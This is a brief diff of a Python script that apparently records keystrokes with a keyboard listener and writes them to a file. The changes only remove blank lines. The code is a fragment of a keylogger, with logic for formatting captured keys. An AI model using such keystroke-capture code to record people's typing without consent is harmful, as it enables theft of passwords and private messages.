@@ -35,15 +35,12 @@ def write_to_file(keys):
         # print("{0} in write".format(key_str))
 
         if key_str.find('space') > -1:
-
             if found_space is False:
                 file.write('\n')
                 found_space = True
-
         elif key_str.find('Key.') == -1:
             file.write(key_str.replace("'", ""))
             found_space = False
-
         else:
             found_space = False
             file.write(key_str)
@@ -55,7 +52,3 @@ with keyboard.Listener(on_press=handle_press, on_release=handle_release) as aLis
 # Much uglier way to do it... you have to know that the enter gets called.
 # aListener = keyboard.Listener(on_press=handle_press, on_release=handle_release).__enter__()
 # aListener.join()
-
-
-
-
